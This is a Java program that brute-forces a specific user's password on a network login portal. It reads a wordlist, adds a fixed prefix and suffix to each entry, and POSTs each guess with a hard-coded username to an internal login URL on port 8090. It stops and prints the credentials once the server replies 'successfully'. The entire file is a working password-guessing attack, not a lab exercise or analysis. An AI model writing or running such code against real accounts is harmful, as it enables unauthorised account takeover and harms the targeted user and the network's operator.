import java.net.*;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;
import org.w3c.dom.NodeList;
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.FileReader;

public class demo{

  public static void main(String arg[]){

StringBuilder sb = new StringBuilder();
        String strLine = "";
        String str_data = "";
       String username="gcs1540030";

        String password=""; 
	String ss="successfully";
        try {
             BufferedReader br = new BufferedReader(new FileReader("wordlist.txt"));
             while (strLine != null)
             {
                if (strLine == null)
                  break;
                str_data += strLine;
                strLine = br.readLine();
    
           password="ty2@"+strLine+"{€¥$}";
	   DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
	   DocumentBuilder builder = factory.newDocumentBuilder();
           String Data = "mode=191&username="+username+"&password="+password;
             System.out.println(Data);
             URL url = new URL("http://10.1.0.7:8090/httpclient.html");
       HttpURLConnection con = (HttpURLConnection) url.openConnection();
       con.setRequestMethod("POST");
       con.setDoOutput(true);
       con.getOutputStream().write(Data.getBytes("UTF-8"));
	   Document doc = builder.parse(con.getInputStream());
	   NodeList list = doc.getElementsByTagName("message");
           String s[]=(list.item(0).getTextContent()).toString().split(" ");

      System.out.println(password);
      System.out.println(s[2]);
      if(s[2].equals(ss))
        break;}
         System.out.println(username+" "+password);
       
    }
catch(Exception e){System.out.println(e);}  

}  
}
